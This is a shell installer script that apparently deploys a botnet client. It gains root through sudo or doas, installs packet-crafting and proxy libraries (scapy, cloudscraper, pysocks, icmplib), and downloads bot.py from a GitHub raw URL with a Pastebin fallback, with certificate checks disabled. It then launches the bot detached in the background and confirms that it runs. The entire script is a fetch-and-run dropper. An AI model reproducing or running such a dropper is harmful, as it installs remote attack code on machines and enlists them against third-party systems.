#!/bin/sh
set +e # Keep going even if some commands fail
trap '' ERR # Ignore ERR trap

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S' 2>/dev/null || echo 'TIME')] $1"; }
check_cmd() { command -v "$1" >/dev/null 2>&1; }
is_root() { [ "$(id -u 2>/dev/null)" = "0" ]; }

USE_SUDO=""
if ! is_root; then
  if check_cmd sudo; then
    USE_SUDO="sudo"
  elif check_cmd doas; then
    USE_SUDO="doas"
  elif check_cmd su; then
    log "No root access. Will try using 'su' later if needed"
  else
    log "Warning: No sudo/doas/su found. Some installations may fail."
  fi
fi

BASE_DIR="$HOME/.local/bin"
[ -z "$HOME" ] && BASE_DIR="/tmp"
WORK_DIR="$BASE_DIR/bot_$(date +%s 2>/dev/null || echo 'run')"
mkdir -p "$WORK_DIR" 2>/dev/null || { WORK_DIR="/tmp/bot_$(date +%s 2>/dev/null || echo 'run')"; mkdir -p "$WORK_DIR"; }
cd "$WORK_DIR" || { WORK_DIR="/tmp/bot_run"; mkdir -p "$WORK_DIR"; cd "$WORK_DIR"; }

find_python() {
  # Prefer system python3 if suitable version, otherwise check specific paths/versions
  for cmd in python3 python3.12 python3.11 python3.10 python3.9 python3.8 python3.7 python3.6; do
    if check_cmd "$cmd"; then
      if "$cmd" -c 'import sys; exit(0 if sys.version_info >= (3,6) else 1)' 2>/dev/null; then
        PYTHON_CMD="$cmd"
        log "Found suitable Python: $PYTHON_CMD"
        return 0
      fi
    fi
  done
  # Check common hardcoded paths as a fallback
  if [ -x "/usr/bin/python3" ] && "/usr/bin/python3" -c 'import sys; exit(0 if sys.version_info >= (3,6) else 1)' 2>/dev/null; then PYTHON_CMD="/usr/bin/python3"; log "Found fallback Python: $PYTHON_CMD"; return 0; fi
  if [ -x "/usr/local/bin/python3" ] && "/usr/local/bin/python3" -c 'import sys; exit(0 if sys.version_info >= (3,6) else 1)' 2>/dev/null; then PYTHON_CMD="/usr/local/bin/python3"; log "Found fallback Python: $PYTHON_CMD"; return 0; fi
  log "No suitable Python found."
  return 1
}

install_deps() {
  [ -z "$USE_SUDO" ] && ! is_root && log "Limited install (no root)" && return 1
  
  local INSTALL_CMD="$USE_SUDO"
  
  log "Attempting package manager install for Python3 and essentials..."
  if check_cmd apt-get; then
    $INSTALL_CMD apt-get update -qq || true
    $INSTALL_CMD apt-get install -y python3 python3-pip curl wget || true
  elif check_cmd apt; then
    $INSTALL_CMD apt update -qq || true
    $INSTALL_CMD apt install -y python3 python3-pip curl wget || true
  elif check_cmd dnf; then
    $INSTALL_CMD dnf -y install python3 python3-pip curl wget || true
  elif check_cmd yum; then
    $INSTALL_CMD yum -y install python3 python3-pip curl wget || true
  elif check_cmd zypper; then
    $INSTALL_CMD zypper --non-interactive install python3 python3-pip curl wget || true
  elif check_cmd pacman; then
    $INSTALL_CMD pacman -Sy --noconfirm python python-pip curl wget || true
  elif check_cmd apk; then
    $INSTALL_CMD apk add python3 py3-pip curl wget || true
  elif check_cmd pkg; then
    $INSTALL_CMD pkg install -y python3 py3-pip curl wget || true
  elif check_cmd opkg; then
    $INSTALL_CMD opkg update || true
    $INSTALL_CMD opkg install python3 python3-pip curl wget || true
  else
    log "Unknown package manager, trying alternatives"
    return 1
  fi
  
  # Add specific package manager installs for libraries if necessary (e.g., libpcap for scapy)
  log "Attempting package manager install for scapy dependencies..."
  if check_cmd apt-get || check_cmd apt; then
       $INSTALL_CMD apt-get install -y libpcap-dev || true
  elif check_cmd apk; then
       $INSTALL_CMD apk add libpcap-dev || true # Alpine uses libpcap-dev
  elif check_cmd yum || check_cmd dnf; then # RHEL/Fedora/CentOS
       $INSTALL_CMD install -y libpcap-devel || true
  elif check_cmd zypper; then # openSUSE
       $INSTALL_CMD install -y libpcap-devel || true
  elif check_cmd pacman; then # Arch
       $INSTALL_CMD install -y libpcap || true
  fi

  return 0
}

try_python_install() {
  if is_root || [ -n "$USE_SUDO" ]; then
    if check_cmd curl; then
      log "Attempting Python install via pyenv..."
      curl -sL https://raw.githubusercontent.com/pyenv/pyenv-installer/master/bin/pyenv-installer | bash || true
      export PATH="$HOME/.pyenv/bin:$PATH"
      if check_cmd pyenv; then
        # Prefer 3.9, fallback to 3.8, then 3.7
        pyenv install 3.9.0 -s || pyenv install 3.8.0 -s || pyenv install 3.7.0 -s || log "pyenv Python install failed"
        # Activate the latest installed version
        pyenv global $(pyenv versions --bare | grep '3' | head -n1) 2>/dev/null || true
        PYTHON_CMD="$HOME/.pyenv/shims/python"
        if [ -n "$PYTHON_CMD" ]; then log "Installed Python via pyenv: $PYTHON_CMD"; return 0; fi
      fi
    fi
  fi
  return 1 # Return failure if pyenv method didn't result in a working PYTHON_CMD
}

download_file() {
  if check_cmd wget; then
    wget -q --no-check-certificate "$1" -O "$2" 2>/dev/null || return 1
    log "Downloaded $1 using wget"
  elif check_cmd curl; then
    curl -sSL --insecure "$1" -o "$2" 2>/dev/null || return 1
    log "Downloaded $1 using curl"
  elif check_cmd fetch; then
    fetch -q -o "$2" "$1" 2>/dev/null || return 1
    log "Downloaded $1 using fetch"
  elif check_cmd ftp; then
    ftp -o "$2" "$1" 2>/dev/null || return 1
    log "Downloaded $1 using ftp"
  elif check_cmd busybox && busybox wget --help 2>&1 | grep -q BusyBox; then
    busybox wget -q -O "$2" "$1" 2>/dev/null || return 1
    log "Downloaded $1 using busybox wget"
  else
    if [ -n "$PYTHON_CMD" ]; then # Use found Python
      log "Attempting download using Python: $PYTHON_CMD..."
      "$PYTHON_CMD" -c "import urllib.request; urllib.request.urlretrieve('$1', '$2')" 2>/dev/null || return 1
      log "Downloaded $1 using Python"
    elif check_cmd python3; then # Fallback to generic python3 if PYTHON_CMD not set
      log "Attempting download using generic python3..."
      python3 -c "import urllib.request; urllib.request.urlretrieve('$1', '$2')" 2>/dev/null || return 1
      log "Downloaded $1 using generic python3"
    elif check_cmd python; then # Fallback to generic python (might be py2)
      log "Attempting download using generic python..."
      # Try py3 urllib first, then py2 urllib2
      python -c "import urllib.request; urllib.request.urlretrieve('$1', '$2')" 2>/dev/null ||
      python -c "import urllib2; open('$2','wb').write(urllib2.urlopen('$1').read())" 2>/dev/null || return 1
      log "Downloaded $1 using generic python"
    else
      log "No download tool or Python found."
      return 1
    fi
  fi
  return 0
}

# Attempt to find Python, then install system deps if needed, then try pyenv if needed.
find_python || { install_deps && find_python; } || { try_python_install && find_python; }

if [ -z "$PYTHON_CMD" ]; then
    log "No Python 3.6+ found or installed. Cannot proceed."
    exit 1
fi

log "Using Python: $PYTHON_CMD"

setup_env() {
  if "$PYTHON_CMD" -m venv env 2>/dev/null; then
    if [ -f env/bin/activate ]; then
      . env/bin/activate 2>/dev/null || true
      log "Virtual environment (venv) created and activated."
      return 0
    elif [ -f env/Scripts/activate ]; then # Windows activate script
      . env/Scripts/activate 2>/dev/null || true
      log "Virtual environment (venv) created and activated (Windows)."
      return 0
    fi
  elif "$PYTHON_CMD" -m virtualenv env 2>/dev/null; then # Try virtualenv if venv fails
    if [ -f env/bin/activate ]; then
      . env/bin/activate 2>/dev/null || true
      log "virtualenv created and activated."
      return 0
    fi
  fi
  log "Could not create virtual environment; proceeding without it."
  return 1
}

setup_env || true # Proceed even if venv fails

if "$PYTHON_CMD" -c "import pip" 2>/dev/null; then
  PIP_CMD="$PYTHON_CMD -m pip"
elif check_cmd pip3; then # Fallback to system pip3
  PIP_CMD="pip3"
elif check_cmd pip; then # Fallback to system pip
  PIP_CMD="pip"
else
  # Attempt to bootstrap pip if not found
  log "Bootstrapping pip..."
  "$PYTHON_CMD" -m ensurepip --user 2>/dev/null || true
  if "$PYTHON_CMD" -c "import pip" 2>/dev/null; then
    PIP_CMD="$PYTHON_CMD -m pip"
  else
    log "Failed to bootstrap pip."
    return 1 # Cannot install python dependencies without pip
  fi
fi

log "Using Pip: $PIP_CMD"
$PIP_CMD install -U pip setuptools wheel 2>/dev/null || true
log "Pip is upgraded."

# Install Python packages required by bot
# Updated list to match bot.py dependencies
log "Installing Python dependencies..."
PYTHON_DEPS="cloudscraper requests pysocks scapy icmplib"
if [ "$(uname)" = "CYGWIN" ] || [ "$(uname)" = "MINGW" ] || [ "$(uname)" = "MSYS" ] || [ "$(uname -o)" = "Msys" ]; then # Check common Windows-like environments
     # Install pywin32 only on Windows-like environments
     $PIP_CMD install $PYTHON_DEPS pywin32 2>/dev/null || $PIP_CMD install --user $PYTHON_DEPS pywin32 2>/dev/null || log "Failed to install python dependencies via pip (including pywin32)"
else # Assume not Windows, don't install pywin32
     $PIP_CMD install $PYTHON_DEPS 2>/dev/null || $PIP_CMD install --user $PYTHON_DEPS 2>/dev/null || log "Failed to install python dependencies via pip (excluding pywin32)"
fi

# Check if essential packages are installed (requests and scapy)
"$PYTHON_CMD" -c "import requests, scapy.all" 2>/dev/null
if [ $? -ne 0 ]; then
    log "Verification of essential python packages (requests, scapy) failed. Installation may not be complete."
    # Attempt a final forceful install if verification failed
    if [ "$(uname)" = "CYGWIN" ] || [ "$(uname)" = "MINGW" ] || [ "$(uname)" = "MSYS" ] || [ "$(uname -o)" = "Msys" ]; then
         $PIP_CMD install --force-reinstall $PYTHON_DEPS pywin32 2>/dev/null || $PIP_CMD install --user --force-reinstall $PYTHON_DEPS pywin32 || log "Forceful pip install failed."
    else
         $PIP_CMD install --force-reinstall $PYTHON_DEPS 2>/dev/null || $PIP_CMD install --user --force-reinstall $PYTHON_DEPS || log "Forceful pip install failed."
    fi
fi


# Download the bot.py script
BOT_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/bot.py"
log "Downloading bot.py..."
download_file "$BOT_URL" "$WORK_DIR/bot.py" ||
{ log "Primary download failed, trying fallback"; BOT_URL="https://pastebin.com/raw/CQiRTJy0"; download_file "$BOT_URL" "$WORK_DIR/bot.py"; } ||
{ log "All downloads failed"; exit 1; }

chmod +x "$WORK_DIR/bot.py" 2>/dev/null || true
# Convert DOS newlines if needed
if check_cmd dos2unix; then
  log "Converting newlines using dos2unix..."
  dos2unix "$WORK_DIR/bot.py" 2>/dev/null || true
else
  log "Converting newlines using tr..."
  tr -d '\r' < "$WORK_DIR/bot.py" > "$WORK_DIR/bot.py.tmp" 2>/dev/null &&
  mv "$WORK_DIR/bot.py.tmp" "$WORK_DIR/bot.py" 2>/dev/null || true
fi

cd "$WORK_DIR" || true
log "Starting bot"

# Start bot in background, redirect output to log
# Use the determined PYTHON_CMD to ensure it runs with the correct interpreter
if [ -n "$PYTHON_CMD" ]; then
  (nohup "$PYTHON_CMD" bot.py > bot.log 2>&1 &) ||
  (setsid "$PYTHON_CMD" bot.py > bot.log 2>&1 &) ||
  ("$PYTHON_CMD" bot.py > bot.log 2>&1 &) ||
  { log "Failed to start with Python"; }

  # Check if bot.py process is running started by the specific python command
  if ! ps -ef 2>/dev/null | grep -v grep | grep "[b]ot.py" | grep "$PYTHON_CMD" > /dev/null; then
    log "Bot process not found using $PYTHON_CMD, trying alternative execution methods."
    chmod +x bot.py 2>/dev/null || true # Ensure execute permission
    # Try executing directly if the script has a shebang
    if grep -q "#!/usr/bin/env python" bot.py || grep -q "#!/usr/bin/python" bot.py; then
         (nohup ./bot.py > bot.log 2>&1 &) ||
         (setsid ./bot.py > bot.log 2>&1 &) ||
         (./bot.py > bot.log 2>&1 &) || log "Failed direct execution"
    fi
  fi
else
  log "No Python found, trying direct execution if bot.py has shebang..."
  chmod +x bot.py 2>/dev/null || true
  if grep -q "#!/usr/bin/env python" bot.py || grep -q "#!/usr/bin/python" bot.py; then
      (nohup ./bot.py > bot.log 2>&1 &) ||
      (setsid ./bot.py > bot.log 2>&1 &) ||
      (./bot.py > bot.log 2>&1 &) || log "Failed direct execution"
  fi
fi


sleep 2
# Final check for bot.py process using broader search
if ps -ef 2>/dev/null | grep -v grep | grep "bot.py" > /dev/null ||
   ps aux 2>/dev/null | grep -v grep | grep "bot.py" > /dev/null; then
  log "Bot running successfully in $WORK_DIR"
  log "Log file: $WORK_DIR/bot.log"
  echo ""
  echo "Installation completed successfully!"
else
  log "Bot may have failed to start. Check manually."
  log "Try running: cd $WORK_DIR && (replace with your working python command) bot.py"
  log "Check $WORK_DIR/bot.log for errors."
  exit 1
fi
